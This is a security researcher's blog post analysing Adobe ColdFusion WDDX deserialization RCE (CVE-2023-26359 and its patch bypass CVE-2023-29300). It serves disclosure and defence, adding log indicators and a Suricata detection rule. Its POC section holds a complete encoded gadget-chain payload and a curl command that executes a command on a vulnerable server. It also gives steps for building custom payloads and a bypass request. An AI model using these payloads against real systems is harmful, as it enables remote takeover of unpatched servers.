---
layout: post
title:  ColdFusion RCE using WDDX deserialization - Story and details behind CVE-2023-26359 and CVE-2023-29300
date:   2024-02-19 10:50:40 +0100
img_path: /assets/img/2024-02-14-ColdFusion-WDDX-2023/
category: blogpost
inadvisory: true
cve: CVE-2023-29300
advisory_title: Adobe ColdFusion RCE 
date_cve: 2024-08-02
details_ok: true
---

*I would like to thank Patrick Vares for his tremendous help analyzing CVE-2023-26359 and its consequences*

# WDDX Deserialization as the culprit behind these vulnerabilities

A ColdFusion application is typically composed of ColdFusion Components (CFC) and ColdFusion templates (CFM), which are respectively implemented in ``.cfc`` or ``.cfm`` files. Templates offer webpage skeletons, with CFC forming the basic application building blocks. A CFC is similar to the concept of a “class” in object-oriented programming languages and offers methods that can be invoked either by CFML code present on the web server or remotely. [[reference 1](https://helpx.adobe.com/coldfusion/developing-applications/building-blocks-of-coldfusion-applications/building-and-using-coldfusion-components/using-coldfusion-components-developing-guide.html), [reference 2](https://helpx.adobe.com/coldfusion/developing-applications/building-blocks-of-coldfusion-applications/building-and-using-coldfusion-components/about-coldfusion-components.html)]

All vulnerabilities discussed in this blog are rooted in a mechanism responsible for invoking CFC methods. For the rest of this paragraph, let’s consider a basic CFC method named mymethod—which requires two arguments named myarg1 and myarg2, and which is defined within the mycomponent.cfc file. This method can be invoked with the use of the special ``argumentcollection`` [ColdFusion parameter](https://www.bennadel.com/blog/2053-using-an-argumentcollection-url-parameter-with-coldfusion-web-services.htm), which can be used on a GET or POST request, and is essentially the list of parameters in serialized form. This serialized form can be in JavaScript Object Notation (JSON) or Web Distributed Data eXchange (WDDX) format—the latter being more of a XML legacy format still supported by ColdFusion.  The WDDX variant is the one of interest here. A typical invocation of the previously considered method through WDDX would be the following request:

```
POST <webpath>/mycomponent.cfc?method=mymethod

argumentCollection=<wddxPacket+version="1.0"><header/><data><struct+type="coldfusion.runtime.ArgumentCollection"><var+name='myarg1'><string>test</string></var><var+name='myarg2'><string>test2</string></var></struct></data></wddxPacket>
```

In the previous request, a WDDX packet is defined, which contains a XML-based serialized coldfusion.runtime.ArgumentCollection class, for which two variables pertaining to our two arguments are defined. Upon reception of this request, ColdFusion will first decode any URL encoded characters in the HTTP body, and will then deserialize the contents of the WDDX packet.

Before CVE-2023-26359, no security checks were implemented to verify the incoming contents of the WDDX packet before deserialization. As a consequence, a malicious input could lead to RCE through crafted deserialization payloads, as already demonstrated by this [in-depth technical publication by ProjectDiscovery](https://blog.projectdiscovery.io/adobe-coldfusion-rce/). 

# CVE-2023-26359 was exploited as a 0-day

At the start of year 2023, Coldfusion was the target of several exploitation campaigns as reported [here](https://www.rapid7.com/blog/post/2023/03/21/etr-rapid7-observed-exploitation-of-adobe-coldfusion/) or [here](https://www.bleepingcomputer.com/news/security/cisa-warns-of-adobe-coldfusion-bug-exploited-as-a-zero-day/). At that time, thanks to my job at CrowdStrike, I analyzed those campaigns. Among the findings, I uncovered a first exploitation chain, *chain1*, that will be later labeled CVE-2023-26360. But against a single instance of a ColdFusion 2016 server which was exploited late February 2023, I was not able to retrieve the same *chain1* exploitation artifacts. Thanks to an accompanying WAF log, it was possible to retrieve partly what looked like the request used to exploit the server:

```
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfc?method=getfmfiles HTTP/1.1

Content-Type: application/x-www-form-urlencoded

argumentCollection=<wddxPacket+version="1.0"><header/><data><struct+type="Lorg.jgroups.blocks.ReplicatedTree;"><var+name="state"><binary+length='3301'>AqztAAVzc[...]
```

An analysis of this request led to the conclusion that exploitation of a deserialization vulnerability was likely and that a second exploitation chain, *chain2*, is used to get initial access to these targeted ColdFusion servers. However, initial reproduction attempts of *chain2* (I was personally trying to get some sort of error message by providing a well-formed yet incomplete request) against a ColdFusion 2021 instance were unsuccessful. At first, the conclusion was that *chain1* and *chain2* exploitation chains were part of the same exploitation campaign, where *chain2* was used to target ColdFusion 2016 instances and *chain1* was used to target ColdFusion 2018 and above instances. As ColdFusion 2016 reached end-of-life support, it was hypothesized *chain2* was leveraging an old vulnerability; hence no need to investigate further.

On 14th March 2023, Adobe released a [security update for Coldfusion](https://helpx.adobe.com/security/products/coldfusion/apsb23-25.html), detailing two different vulnerabilities, CVE-2023-26360 and CVE-2023-26359, both affecting ColdFusion 2018 and ColdFusion 2021. The first one was labeled as an improper access and the second one being a deserialization vulnerability. Upon analysis of a ColdFusion 2021 patch, I came to the following conclusions (ref to Rapid7 analysis):

- [addition of the variable ``allowNonCFCDeserialization``](https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis) pertained to CVE-2023-26359
- [additional checks introduced in ``coldfusion.runtime.TemplateProxyFactory.resolveFile`` pertained to CVE-2023-26360](https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis)

Hence, I concluded that the two vulnerabilities were in fact associated with the same *chain1* previously reported, as a means for Adobe to better track code changes.

However, on 12th April 2023, Adobe modified the security bulletin by stating that CVE-2023-26360 is a deserialization vulnerability as well. From then, the previous conclusions had been rendered inconclusive. Indeed, all modifications were pertaining to the exploitation chain *chain1*, and only one of the code modifications was tied to a deserialization problem. To figure it out, I contacted original reporters of both CVE-2023-26360 and CVE-2023-26359, Charlie Arehart and Patrick Vares, who were both kind enough to provide some details. 

Based on those details, I was able to come up with the following conclusions:

- *chain1* was tied to CVE-2023-26360
- *chain2* was tied to CVE-2023-26359
- **CVE-2023-26359 was used as a 0day**. And Patrick Vares who reported it actually did so after a thorough and nice investigation of two compromised ColdFusion servers. As of this writing, Adobe refused to indicate this in their bulletins.
- **All code changes in ColdFusion 2021 patch were pertaining to CVE-2023-26360. Somehow, CVE-2023-26359 is intact there.**

# CVE-2023-26359 details

## Analysis

I won't describe in much details the inner workings of the WDDX deserialization vulnerability occuring here, as [ProjectDiscovery already did](https://blog.projectdiscovery.io/adobe-coldfusion-rce/). Let's have a simple look at the ITW exploit instead:

```
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfc?method=getfmfiles HTTP/1.1

Content-Type: application/x-www-form-urlencoded

argumentCollection=<wddxPacket+version="1.0"><header/><data><struct+type="Lorg.jgroups.blocks.ReplicatedTree;"><var+name="state"><binary+length='3301'>AqztAAVzc[...]</binary></var></struct></data></wddxPacket>
```

Here, when the WDDX request contents are deserialized through the ``WDDXDeserialize`` function, a ``ReplicatedTree`` class is first instantiated, followed by the ``state`` parameter of the ``ReplicatedTree`` class being set through the ``setState`` method. This method calls the ``jgroup``’s ``Util.objectFromByteBuffer`` method, which will consider the value passed for the state parameter as an ObjectInputStream and will call the ``readObject`` method on the value of this ``state`` parameter. People used to Java deserialization are gonna immediately recognize this to be a pattern commonly found in deserialization gadgets. In fact, this gadget chain was very similar to a previous exploit chain targeting Coldfusion and explained in one of [CodeWhiteSec’s blog](https://codewhitesec.blogspot.com/2018/03/exploiting-adobe-coldfusion.html) (also used in their [ColdFusionPwn tool](https://github.com/codewhitesec/ColdFusionPwn/tree/master)). In the end, full RCE is directly obtained, with the rights of the user running the ColdFusion server.

## POC

The following reproduction steps demonstrate how to use CVE-2023-26359 to create a "foo" file within the ``/tmp`` directory of a vulnerable ColdFusion 2018:
```
$ docker run -dt -p "8500:8500" --env "acceptEULA=YES" --env "password=admin" --env "deploymentType=Production" --env "allowedAdminIPList=*.*.*.*,0.0.0.0" --name cf_test adobecoldfusion/coldfusion2018:2018.0.15

$ echo "argumentCollection=%3CwddxPacket+version%3D%271.0%27%3E%3Cheader%2F%3E%3Cdata%3E%3Cstruct+type%3D%27Lorg.jgroups.blocks.ReplicatedTree%3B%27%3E%3Cvar+name%3D%27state%27%3E%3Cbinary+length%3D%273292%27%3EAqztAAVzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAACAAAAAnNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5PYmplY3RCZWFugpkH3nYElEoCAANMAA5fY2xvbmVhYmxlQmVhbnQALUxjb20vc3VuL3N5bmRpY2F0aW9uL2ZlZWQvaW1wbC9DbG9uZWFibGVCZWFuO0wAC19lcXVhbHNCZWFudAAqTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0VxdWFsc0JlYW47TAANX3RvU3RyaW5nQmVhbnQALExjb20vc3VuL3N5bmRpY2F0aW9uL2ZlZWQvaW1wbC9Ub1N0cmluZ0JlYW47eHBzcgArY29tLnN1bi5zeW5kaWNhdGlvbi5mZWVkLmltcGwuQ2xvbmVhYmxlQmVhbvU%2FP7HRRzl4AgACTAARX2lnbm9yZVByb3BlcnRpZXN0AA9MamF2YS91dGlsL1NldDtMAARfb2JqdAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAeamF2YS51dGlsLkNvbGxlY3Rpb25zJEVtcHR5U2V0FfVyHbQDyygCAAB4cHNxAH4AAnNxAH4AB3EAfgAMc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGosr%2Bur4AAAAyADkKAAMAIgcANwcAJQcAJgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEADElubmVyQ2xhc3NlcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAKAEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgArAC4BAA50b3VjaCAvdG1wL2ZvbwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjY3MzkzNzkyNzY4NDc5AQAfTHlzb3NlcmlhbC9Qd25lcjY3MzkzNzkyNzY4NDc5OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AFwAAAdTK%2Frq%2BAAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4c3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLkVxdWFsc0JlYW7Oh8tx5AASNAIAAkwACl9iZWFuQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wABF9vYmpxAH4ACXhwdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHEAfgAUc3IAKmNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLlRvU3RyaW5nQmVhblqODySJr%2FvtAgACTAAKX2JlYW5DbGFzc3EAfgAcTAAEX29ianEAfgAJeHBxAH4AH3EAfgAUc3EAfgAbdnEAfgACcQB%2BAA1zcQB%2BACBxAH4AI3EAfgANcQB%2BAAZxAH4ABnEAfgAGeA%3D%3D%3C%2Fbinary%3E%3C%2Fvar%3E%3C%2Fstruct%3E%3C%2Fdata%3E%3C%2FwddxPacket%3E" > payload

$ curl -XPOST --data "@payload" http://localhost:8500/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfc?method=getfmfiles

$ docker exec -it cf_test ls /tmp
```

So the real question: "how to create your own payload". I'll leave the reader with these reproduction steps from Patrick Vares, who once again did an outstanding job here:

1. Resurrect the ``ColdFusionPwn`` exploit kit but modify it so the output is WDDX serialized. To ensure the payload is compatible with the targeted ColdFusion version, use the ColdFusion's own WDDX serializer:
   - add `cfusion.jar` as a library dependency for building and executing the exploit kit.
    - modify the project to output Wddx:

       ```java
       import coldfusion.rds.WddxUtils;
  
       String content = WddxUtils.writeObject(payload);
        ```

2. As explained in this [blog post](https://nickbloor.co.uk/2018/06/18/another-coldfusion-rce-cve-2018-4939/) from `NickstaDB`, the `ysoserial` tool to be used with ``ColdFusionPwn`` should be compiled against the `rome-cf.jar` included within the targeted ColdFusion version to ensure the `serialVersionUID`'s match.

3. use the newly created tools to craft a gadget chain using the `ROME` Gadget Chain within `ysoserial`

# CVE-2023-29300 Discovery

As explained in the *CVE-2023-26359 was exploited as a 0-day* paragraph, the ColdFusion 2021 patch left intact CVE-2023-26359. To understand the reason for that, a ColdFusion 2018 was patch diffed instead, and Adobe’s provided fix for CVE-2023-26359 was now apparent: It essentially removed the ``ReplicatedTree`` classes from the ColdFusion runtime libraries, as outlined in the following figure.

![patchdiff](image1.png)

The absence of the ``org.jgroups.**`` classes in ColdFusion 2021 explains why no patch for CVE-2023-26359 was detected at first (and reproduction attempts were unsuccessful). This implies the fix prevented the observed ITW exploit by removing the possibility of ``org.jgroups.blocks.ReplicatedTree`` class instantiation; however, this mitigation strategy did not prevent attackers from targeting alternative library classes that can potentially be used for deserializing user-controlled input and ultimately facilitating code execution.

In particular, ColdFusion runtime libraries were still containing classes that allow for the same exploitation pattern as the observed ITW exploit targeting CVE-2023-26359, as explained in this already mentioned [CodeWhiteSec blog](https://codewhitesec.blogspot.com/2018/03/exploiting-adobe-coldfusion.html):

![classes](image2.png)

To finally achieve RCE after CVE-2023-26359 patch, all that was needed is to use one of those alternate classes as the struct for the WDDX data:

```
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfc?method=getfmfiles HTTP/1.1

Content-Type: application/x-www-form-urlencoded

argumentCollection=<wddxPacket+version="1.0"><header/><data><struct+type="Lorg.jgroups.blocks.DistributedTree;"><var+name="state"><binary+length='3301'>AqztAAVzc[...]</binary></var></struct></data></wddxPacket>
```

# For Defenders Against CVE-2023-26359 and CVE-2023-29300

## Indicator of Exploitation 

*please note this should apply to CVE-2023-36803 and CVE-2023-36804 as well*

After the WDDX packet content is deserialized, it is cast to either a ``Struct`` in ColdFusion 2018 and 2021 or to a ``FastHashTable`` structure in ColdFusion 2016 to create the ``argumentCollection`` object, as highlighted in the following code snippet from ColdFusion 2018:

```java
Struct argumentCollection;

if (attr == null) {
    argumentCollection = new Struct();
} else {
    attr = attr.trim();
    if (attr.charAt(0) == '{') {
        argumentCollection = (Struct)JSONUtils.deserializeJSON(attr);
    } else {
        argumentCollection = (Struct)WDDXDeserialize(attr);
    }
}
```

In legitimate cases, the base class used to pass the arguments to a CFC method through WDDX is ``coldfusion.runtime.ArgumentCollection``. When using this class, the cast present in the aforementioned code snippet does not cause any issues. However, in the case of an exploit targeting the previously mentioned vulnerabilities, the type cast from the class used as a deserialization payload to ``Struct`` or ``FastHashTable`` is illegal and results in an error that can be found in Coldfusion’s ``coldfusion-out`` log file:

- ColdFusion 2016:

  ```
  <timestamp> Error [<thread>] - <attacker’s class used for deserialization exploit> cannot be cast to coldfusion.util.FastHashtable

  The specific sequence of files included or processed is: <endpoint used by attacker>
  ```


- ColdFusion 2018 and 2021:

  ```
  <timestamp> Error [<thread>] - class <attacker’s class used for deserialization exploit> cannot be cast to class coldfusion.runtime.Struct (<attacker class used for deserialization exploit> and coldfusion.runtime.Struct are in unnamed module of loader coldfusion.bootstrap.BootstrapClassLoader<redacted>)

  The specific sequence of files included or processed is: <endpoint used by attacker>
  ```

It should be noted the presence of this error does not mean for sure that exploitation was attempted. In case it’s present, a forensic analysis is warranted.

## Network Signature

Setting an efficient request blocking is not an easy task for the exploits leveraging those vulnerabilities, given the possible variants on the initial class used for deserialization, the possibility of request encoding, the GET/POST variant and the need for legitimate uses in production code. The following Suricata rule aims at detecting, for the basic payloads, whenever a non-ColdFusion class is used in WDDX data within a POST request. 

```
alert http $EXTERNAL_NET any -> $COLDFUSION_SERVER_IP $COLDFUSION_SERVER_PORT (msg: "potential ColdFusion 2023 WDDX deserialization exploit attempt"; flow:to_server, established; http.method; content:"POST"; http.uri; content:".cfc"; nocase; http.request_body; content:"argumentCollection"; http.request_body;  content:"wddxPacket"; distance:1; within:12; http.request_body; content:"struct type"; http.request_body; content:!"coldfusion"; distance:1; within:12; sid:XXXXXXXX; rev:XXXXXXX;)
```

# Conclusion

I do hope information contained in this post is still of some value despite being published almost 1 year later. As of this writing, WDDX deserialization was the root cause for many security patches in 2023 for ColdFusion. Simply put, CVE-2023-29300 is a CVE-2023-26359 patch bypass, CVE-2023-38203 is a CVE-2023-2930 patch bypass, and CVE-2023-38204 is a CVE-2023-38203 patch bypass. Now, WDDX deserialization is protected by a whitelist approach allowing only for Coldfusion classes to be deserialized. Even if [NCC group still highlighted possible vulnerabilities using these](https://research.nccgroup.com/2023/11/21/technical-advisory-adobe-coldfusion-wddx-deserialization-gadgets/), I do have the impression that RCE through WDDX deserialization is now dead (please note this is an impression and not the result of a thorough code analysis). As a consequence, please make sure to have your ColdFusion instances updated.
